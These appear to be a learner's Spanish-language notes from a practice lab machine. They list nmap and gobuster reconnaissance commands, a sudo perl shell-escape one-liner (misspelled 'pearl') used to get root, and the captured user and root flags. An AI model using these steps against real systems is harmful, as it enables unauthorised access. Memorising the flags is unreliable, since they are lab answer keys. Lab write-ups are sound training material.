- --
- Tags: #ejptmachine 
- ---

`nmap -p- --min-rate 5000 -sCV -n 10.10.10.56 -oN portScan`
![Pasted image 20250112175544](../../Fotos/Pasted%20image%2020250112175544.png)

![Pasted image 20250112175558](../../Fotos/Pasted%20image%2020250112175558.png)

`gobuster dir -u http://10.10.10.56 -w /usr/share/SecLists/Discovery/Web-Content/common.txt`
![Pasted image 20250112180018](../../Fotos/Pasted%20image%2020250112180018.png)

![Pasted image 20250112180828](../../Fotos/Pasted%20image%2020250112180828.png)

Modulo 1
![Pasted image 20250112181729](../../Fotos/Pasted%20image%2020250112181729.png)

![Pasted image 20250112182030](../../Fotos/Pasted%20image%2020250112182030.png)

![Pasted image 20250112182056](../../Fotos/Pasted%20image%2020250112182056.png)

`Maquina Vulnerada`

User Flag: 3197219d6535f1285529e997d47371de

---

*Escalada de Privilegios*

`sudo pearl -e 'exec "/bin/sh"'`
![Pasted image 20250112183136](../../Fotos/Pasted%20image%2020250112183136.png)

![Pasted image 20250112183338](../../Fotos/Pasted%20image%2020250112183338.png)

Root Flag: 3a77ddaacf19f077d8474ad5a2a54084

-----

*Preguntas*


